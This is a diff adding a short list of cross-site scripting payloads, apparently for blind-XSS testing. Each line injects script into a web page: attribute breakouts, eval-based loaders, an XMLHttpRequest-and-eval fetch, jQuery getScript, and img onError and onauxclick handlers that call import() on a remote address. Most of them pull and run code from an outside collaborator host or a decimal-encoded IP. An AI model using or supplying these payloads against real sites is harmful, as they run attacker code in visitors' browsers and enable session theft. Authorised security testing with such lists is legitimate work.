@@ -1,0 +1,6 @@
+"><script src=//xsspoc.collabxyz.net>
+</script> javascript:eval('var a=document.createElement(\'script\');a.src=\'http://xsspoc.collabxyz.net\';document.body.appendChild(a)') 
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xsspoc.collabxyz.net");a.send();</script> <script>$.getScript("//xsspoc.collabxyz.net")</script> 
+<img src=x onError=import('//1088513708/')> 
+<x onauxclick=import('//1088513708/')>click 
+<x onauxclick=import('//1088513708/')>click
